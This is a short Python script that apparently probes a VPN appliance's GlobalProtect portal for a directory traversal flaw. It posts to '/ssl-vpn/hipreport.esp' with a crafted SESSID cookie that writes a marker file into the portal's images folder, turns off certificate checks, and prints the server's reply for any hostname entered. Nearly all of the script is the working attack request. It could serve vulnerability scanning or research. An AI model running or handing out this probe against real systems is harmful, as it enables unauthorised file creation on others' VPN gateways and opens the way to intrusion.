import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def test_directory_traversal(url):
    
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    
    headers = {
        'Cookie': 'SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/watchtowr.txt;'
    }

    
    response = requests.post(url + '/ssl-vpn/hipreport.esp', headers=headers, verify=False)

    
    if response.status_code == 200:
        print("Received a response from the server.")
        print("Response headers:", response.headers)
        print("Response body:", response.text[:1000])  
    else:
        print("Failed to receive a successful HTTP response. Status code:", response.status_code)

def main():
    
    hostname = input("Please enter the hostname (e.g., https://vpn.company.tld): ")
    test_directory_traversal(hostname)

if __name__ == "__main__":
    main()
